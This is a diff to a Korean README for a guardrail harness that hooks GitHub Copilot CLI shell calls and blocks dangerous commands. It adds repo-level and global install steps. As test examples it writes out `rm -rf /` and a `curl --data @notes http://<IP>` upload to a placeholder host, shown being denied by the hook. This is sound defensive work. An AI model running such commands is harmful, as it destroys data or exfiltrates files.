@@ -91,9 +91,18 @@ echo '{"command":"rm -rf /"}' | node .agents/scripts/pre-tool-use.js   # exit 2 
 ```
 
 ## 6. GitHub Copilot에 설치
-1. clone → repo 루트에서 `copilot` 실행. `AGENTS.md`/`.agents/skills`가 자동 로드.
-2. `/guardrail-review`, `/secret-scan` 등 스킬 호출.
-3. 실차단: 에이전트 pre-tool-use hook → `.agents/scripts/pre-tool-use.js` (exit 2 = block).
+copilot CLI의 **네이티브 hook**을 써서 모든 셸 도구 호출을 실행 전 가로챈다.
+
+**A. 이 repo에서만 (repo-level, 설정 0)**
+1. clone → repo 루트에서 `copilot` 실행. `AGENTS.md`/`.agents/skills`/`.github/hooks/pre-tool-use.json` 자동 로드.
+2. 셸 명령 실행 시 `pre-tool-use.js`가 평가 → high 심각도면 hook이 deny(exit 2).
+3. `/guardrail-review`·`/secret-scan` 등 스킬도 호출 가능.
+
+**B. 전역 (어느 폴더든 자동 보호)**
+```bash
+pwsh install-global.ps1
+```
+스킬 7개 → `~/.copilot/skills`, 엔진·룰셋·hook → `~/.copilot/harness`, `preToolUse` hook → `~/.copilot/settings.json`. 이후 **어떤 프로젝트에서 copilot을 켜도** 위험 명령은 실행 전 차단된다. (검증: temp 폴더의 `curl --data @notes http://<IP>` → `Denied by preToolUse hook from global settings`.)
 
 ## 7. 동작 흐름
 ```
